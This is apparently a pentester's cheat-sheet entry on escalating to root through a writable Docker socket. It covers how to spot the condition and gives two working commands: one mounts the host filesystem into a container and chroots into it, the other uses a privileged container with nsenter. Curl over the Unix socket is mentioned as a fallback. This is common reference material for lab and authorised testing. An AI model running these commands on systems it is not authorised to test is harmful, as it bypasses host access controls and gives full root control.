#vulnerability

# Writable Docker Socket
## What is Writable Docker Socket?
If you have privileges to write to `docker`'s socket - you can get root!

## What does Writable Docker Socket give me?
Root!

## Any documentation on Writable Docker Socket?
[HackTricks - Writeable docker socket](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-docker-socket)

## How do I verify that a target is vulnerable?
* `groups` - `docker`
* `/var/run/docker.sock`

## How do I use Writable Docker Socket?
### Bash
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
if you get an error that package `ubuntu`/`debian` is not available - run `docker images` to find a local image you can use!

### Curl
If you cannot use the `docker` bash executable for some reason, you can use `curl --unix-socket` for communication.[]()